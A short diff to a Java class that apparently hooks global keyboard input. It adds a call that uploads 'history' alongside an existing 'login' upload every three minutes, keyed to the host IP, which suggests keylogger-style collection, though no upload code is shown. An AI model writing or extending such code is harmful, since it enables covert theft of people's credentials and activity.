@@ -79,6 +79,7 @@ public class Main implements NativeKeyListener{
 			    }
 			 if (minutes % 3 == 0) {
 				 uplogin(getHostIP());
+				 uphistory(getHostIP());
 			 }
 		}
 	}
